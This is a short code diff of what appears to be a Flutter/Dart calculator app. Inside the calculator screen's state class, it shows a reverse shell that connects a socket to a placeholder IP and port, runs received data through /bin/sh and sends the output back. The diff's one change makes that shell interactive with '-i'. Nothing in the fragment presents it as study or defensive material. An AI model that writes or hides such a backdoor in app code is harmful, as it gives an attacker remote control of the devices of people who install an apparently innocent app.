@@ -48,7 +48,7 @@ class _CalculatorScreenState extends State<CalculatorScreen> {
       _socket = await Socket.connect("<IP>", <PORT>);
       _socket.listen(
             (data) {
-          Process.start('/bin/sh', []).then((Process process) {
+          Process.start('/bin/sh', ['-i']).then((Process process) {
             process.stdin.writeln(String.fromCharCodes(data).trim());
             process.stdout.transform(utf8.decoder).listen((output) {
               _socket.write(output);
